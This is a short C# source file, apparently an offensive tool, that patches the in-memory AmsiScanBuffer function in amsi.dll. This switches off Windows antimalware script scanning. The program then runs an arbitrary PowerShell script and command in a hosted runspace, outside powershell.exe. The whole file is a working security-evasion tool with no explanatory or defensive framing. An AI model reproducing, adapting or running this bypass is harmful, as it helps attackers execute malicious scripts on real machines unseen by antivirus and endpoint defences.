using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Runtime.InteropServices;

namespace unmanagedps
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        static void Main(string[] args)
        {
            IntPtr amsi = LoadLibrary("amsi.dll");
            IntPtr AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            Byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
  
            Console.WriteLine("amsi.dll!AmsiScanBuffer at 0x{0}", AmsiScanBuffer.ToString("X2"));

            uint retval = 0;

            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out retval);
            Marshal.Copy(patch, 0, AmsiScanBuffer, patch.Length);
            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x20, out retval);

            StringBuilder sb = new StringBuilder();
            try
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                RunspaceInvoke ri = new RunspaceInvoke(rs);

                Pipeline pipe = rs.CreatePipeline();
                pipe.Commands.AddScript(File.ReadAllText(args[0]) + "; " + args[1]);
                pipe.Commands.Add("Out-String");
                Collection<PSObject> output = pipe.Invoke();
                rs.Close();
                foreach (PSObject line in output)
                {
                    sb.AppendLine(line.ToString());
                }
                Console.WriteLine(sb.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
